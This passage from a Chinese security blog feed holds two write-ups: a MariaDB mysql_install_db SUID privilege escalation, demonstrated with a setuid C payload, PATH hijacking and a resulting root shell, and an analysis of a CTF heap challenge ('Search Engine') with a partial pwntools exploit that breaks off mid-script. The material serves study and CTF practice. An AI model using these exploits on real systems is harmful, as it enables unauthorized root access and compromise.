class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool"</span> &amp;&amp; \</span><br><span class="line">494     chmod 04755 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool"</span></span><br><span class="line">495     <span class="keyword">if</span> <span class="built_in">test</span> $? -ne 0</span><br><span class="line">496     <span class="keyword">then</span></span><br><span class="line">497         <span class="built_in">echo</span> <span class="string">"Couldn't set an owner to '<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool'."</span></span><br><span class="line">498         <span class="built_in">echo</span> <span class="string">" It must be root, the PAM authentication plugin doesn't work otherwise.."</span></span><br><span class="line">499         <span class="built_in">echo</span></span><br><span class="line">500     <span class="keyword">fi</span></span><br><span class="line">501   <span class="keyword">fi</span></span><br><span class="line">502   args=<span class="string">"<span class="variable">$args</span> --user=<span class="variable">$user</span>"</span></span><br><span class="line">503 <span class="keyword">fi</span></span><br><span class="line">504</span><br><span class="line">505 <span class="keyword">if</span> <span class="built_in">test</span> -f <span class="string">"<span class="variable">$ldata</span>/mysql/user.frm"</span></span><br><span class="line">506 <span class="keyword">then</span></span><br><span class="line">507     <span class="built_in">echo</span> <span class="string">"mysql.user table already exists!"</span></span><br><span class="line">508     <span class="built_in">echo</span> <span class="string">"Run mysql_upgrade, not mysql_install_db"</span></span><br><span class="line">509     <span class="built_in">exit</span> 0</span><br><span class="line">510 <span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><code>chmod 04755 &quot;$pamtooldir/auth_pam_tool_dir/auth_pam_tool&quot;</code></p><p>主要是这句话，0 的意思是所有权是 root，4 是设置 suid 当用户执行它的时候，用临时拥有文件所有者权利。</p><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix 中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。简而言之用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的 UID 和 GID。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有了这个点就很容易利用它来提权了，写一个下面这个东西来替换<code>auth_pam_tool</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">"ps"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我装的环境可能已经加上补丁了，对目录没有读权限了，现在把它恢复到有漏洞的情况，就是有读和执行权限。我的环境，我也没有删除权限啊….</p><p>切到 root 把这些操作完了，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># ll</span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 1 mysql root 4096 Mar 24 14:58 ./</span><br><span class="line">drwxr-xr-x 1 root  root 4096 Oct 31 23:00 ../</span><br><span class="line">lrwxrwxrwx 1 root  root   13 Mar 24 14:58 auth_pam_tool_dir -&gt; /home/ssj/exp*</span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># export PATH=.:$PATH</span></span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># ln -s /bin/bash ps</span></span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># mysql_install_db --user=mysql</span></span><br><span class="line">chown: cannot access <span class="string">'/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool'</span>: No such file or directory</span><br><span class="line">Couldn<span class="string">'t set an owner to '</span>/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool<span class="string">'.</span></span><br><span class="line"><span class="string"> It must be root, the PAM authentication plugin doesn'</span>t work otherwise..</span><br><span class="line"></span><br><span class="line">Installing MariaDB/MySQL system tables <span class="keyword">in</span> <span class="string">'/var/lib/mysql'</span> ...</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>然后，见证奇迹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssj@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir$ ll</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 1 mysql root 4096 Mar 24 15:11 ./</span><br><span class="line">drwxr-xr-x 1 root  root 4096 Oct 31 23:00 ../</span><br><span class="line">lrwxrwxrwx 1 root  root   13 Mar 24 14:58 auth_pam_tool -&gt; /home/ssj/exp*</span><br><span class="line">lrwxrwxrwx 1 root  root    9 Mar 24 14:59 ps -&gt; /bin/bash*</span><br><span class="line">ssj@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir$ ./auth_pam_tool</span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>哈哈哈，分析完毕。</p><h2 id="重点在这"><a href="#重点在这" class="headerlink" title="重点在这"></a>重点在这</h2><p>我刚反应过来为啥啥啥都不行了，因为应该用 mysql 那个用户，不是我随便建的呜呜呜。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ rm auto_pam_tool</span><br><span class="line">rm: cannot remove <span class="string">'auto_pam_tool'</span>: No such file or directory</span><br><span class="line">$ rm auth_pam_tool</span><br><span class="line">rm: remove write-protected regular file <span class="string">'auth_pam_tool'</span>? y</span><br><span class="line">$ ln -s /tmp/exp auth_pam_tool</span><br><span class="line">$ ls -al</span><br><span class="line">total 8</span><br><span class="line">drwx------ 1 mysql root  4096 Mar 24 15:24 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 31 23:00 ..</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    8 Mar 24 15:24 auth_pam_tool -&gt; /tmp/exp</span><br><span class="line">$ ln -s /bin/bash ps</span><br><span class="line">$ ls -al</span><br><span class="line">total 8</span><br><span class="line">drwx------ 1 mysql root  4096 Mar 24 15:25 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 31 23:00 ..</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    8 Mar 24 15:24 auth_pam_tool -&gt; /tmp/exp</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    9 Mar 24 15:25 ps -&gt; /bin/bash</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>切到 root 执行<code>mysql_install_db --user=mysql</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># su mysql</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ ./auth_pam_tool</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>嘤嘤嘤，可以了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可 MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。在存储引擎方面，使用XtraDB（英语：XtraDB）来代
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Search Engine 分析</title>
    <link href="https://github.com/Cracke-S-J/2020/03/21/search-engine%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/03/21/search-engine%E5%88%86%E6%9E%90/</id>
    <published>2020-03-21T06:25:59.000Z</published>
    <updated>2020-03-31T14:45:25.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br></pre></td></tr></table></figure><p>这个程序有两种选择，1 对应如下，输入了一个 word，很好，完全不知道在索引什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_search</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> word_sz; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">void</span> *word_ptr; <span class="comment">// r12</span></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the word size:"</span>);</span><br><span class="line">  word_sz = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(word_sz - <span class="number">1</span>) &gt; <span class="number">0xFFFD</span> )</span><br><span class="line">    do_put(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the word:"</span>);</span><br><span class="line">  word_ptr = <span class="built_in">malloc</span>(word_sz);</span><br><span class="line">  read_str((__int64)word_ptr, word_sz, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = qword_6020B8; i; i = *(_QWORD *)(i + <span class="number">32</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( **(_BYTE **)(i + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(i + <span class="number">8</span>) == word_sz &amp;&amp; !<span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)i, word_ptr, word_sz) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1L</span>L, <span class="string">"Found %d: "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>));</span><br><span class="line">        fwrite(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(i + <span class="number">16</span>), <span class="number">1u</span>LL, *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>), <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Delete this sentence (y/n)?"</span>);</span><br><span class="line">        read_str((__int64)&amp;v3, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">121</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(*(<span class="keyword">void</span> **)(i + <span class="number">16</span>), <span class="number">0</span>, *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>));</span><br><span class="line">          <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(i + <span class="number">16</span>)); <span class="comment">// 这里也没有设为 NULL</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Deleted!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(word_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以大致分析出 Word 结构体的模样，一个链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Word</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>* word_ptr;         <span class="comment">// i</span></span><br><span class="line">    <span class="keyword">int</span> word_sz;            <span class="comment">// i + 8</span></span><br><span class="line">    <span class="keyword">char</span>* sen_ptr;          <span class="comment">// i + 16</span></span><br><span class="line">    <span class="keyword">int</span> sen_sz;             <span class="comment">// i + 24</span></span><br><span class="line">    Word* prev;             <span class="comment">// i + 32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 IDA 中还原一下，切到 Structrues，Edit-&gt;Add struct type，然后在 ends 摁 d，添加成员调整大小，再摁 n 改名。（我知道有内存对齐，int 不是 4 字节，但是懒得写了）</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Word            struc ; (sizeof=<span class="number">0x28</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> word_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> word_sz         dq ?</span><br><span class="line"><span class="number">00000010</span> sen_ptr         dq ?</span><br><span class="line"><span class="number">00000018</span> sen_sz          dq ?</span><br><span class="line"><span class="number">00000020</span> prev            dq ?</span><br><span class="line"><span class="number">00000028</span> Word            ends</span><br></pre></td></tr></table></figure><p>所以上面代码就变成了这样，应该就可以看懂了。（IDA 牛逼！）</p><p>下面这个函数是输入一个句子，然后把词分出来，加到链表里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sz; <span class="comment">// eax</span></span><br><span class="line">  __int64 sz_1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> sen_sz; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">char</span> *sen_ptr; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rbp</span></span><br><span class="line">  Word *new_word; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> wd_sz; <span class="comment">// edx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 word_head; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the sentence size:"</span>);</span><br><span class="line">  sz = get_num();</span><br><span class="line">  sz_1 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(sz - <span class="number">1</span>);</span><br><span class="line">  sen_sz = sz;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sz_1 &gt; <span class="number">0xFFFD</span> )</span><br><span class="line">    do_put(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the sentence:"</span>);</span><br><span class="line">  sen_ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(sen_sz);</span><br><span class="line">  read_str((__int64)sen_ptr, sen_sz, <span class="number">0</span>);</span><br><span class="line">  v4 = (<span class="keyword">signed</span> __int64)(sen_ptr + <span class="number">1</span>);</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int64)&amp;sen_ptr[sz_1 + <span class="number">2</span>];</span><br><span class="line">  new_word = (Word *)<span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  wd_sz = <span class="number">0</span>;</span><br><span class="line">  new_word-&gt;word_ptr = (__int64)sen_ptr;</span><br><span class="line">  LODWORD(new_word-&gt;word_sz) = <span class="number">0</span>;</span><br><span class="line">  new_word-&gt;sen_ptr = (__int64)sen_ptr;</span><br><span class="line">  LODWORD(new_word-&gt;sen_sz) = sen_sz;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *(_BYTE *)(v4 - <span class="number">1</span>) != <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(new_word-&gt;word_sz) = ++wd_sz;</span><br><span class="line">LABEL_4:</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 == v5 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( wd_sz )</span><br><span class="line">    &#123;</span><br><span class="line">      word_head = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)new_word;</span><br><span class="line">      new_word-&gt;prev = word_head;</span><br><span class="line">      new_word = (Word *)<span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">      wd_sz = <span class="number">0</span>;</span><br><span class="line">      new_word-&gt;word_ptr = v4;</span><br><span class="line">      LODWORD(new_word-&gt;word_sz) = <span class="number">0</span>;</span><br><span class="line">      new_word-&gt;sen_ptr = (__int64)sen_ptr;</span><br><span class="line">      LODWORD(new_word-&gt;sen_sz) = sen_sz;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    new_word-&gt;word_ptr = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="keyword">if</span> ( wd_sz )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)new_word;</span><br><span class="line">    new_word-&gt;prev = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(new_word);  <span class="comment">// 没有设为 NULL</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Added sentence"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在读字符串的函数里，由于传入的 flag 永远是 0，所以没有结尾 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">read_str</span><span class="params">(__int64 res, <span class="keyword">int</span> len, <span class="keyword">int</span> bool_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> flag; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *tmp_ptr; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> tmp_len; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    flag = bool_flag;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      tmp_ptr = (_BYTE *)(res + idx);</span><br><span class="line">      tmp_len = fread((<span class="keyword">void</span> *)(res + idx), <span class="number">1u</span>LL, <span class="number">1u</span>LL, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( tmp_len &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *tmp_ptr == <span class="string">'\n'</span> &amp;&amp; flag ) <span class="comment">// 永远为 false</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx )</span><br><span class="line">        &#123;</span><br><span class="line">          *tmp_ptr = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx = tmp_len - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( len &lt;= tmp_len - <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        idx += tmp_len;</span><br><span class="line">        <span class="keyword">if</span> ( len &lt;= idx )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( idx != len )</span><br><span class="line">    do_put(<span class="string">"Not enough data"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读 number 的时候，也没有将 str 设为 null，所以读取内容不合法的时候，可以泄露：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">get_num</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *endptr; <span class="comment">// [rsp+8h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+10h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read_str((__int64)&amp;nptr, <span class="number">48</span>, <span class="number">1</span>);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"%s is not a valid number\n"</span>, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="基本思路如下"><a href="#基本思路如下" class="headerlink" title="基本思路如下"></a>基本思路如下</h3><ol><li>利用 unsorted bin 地址泄漏 libc 基地址</li><li>利用 double free 构造 fastbin 循环链表</li><li>分配 chunk 到 malloc_hook 附近，修改 malloc_hook 为 one_gadget</li></ol><h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>这里分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 unsorted bin 的地址的起始字节不是 \x00 便可以通过验证。同时，可以构造 \x00 来进行比较，从而通过验证：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'a'</span> * <span class="number">0x85</span> + <span class="string">' b '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'b'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    p.recvuntil(<span 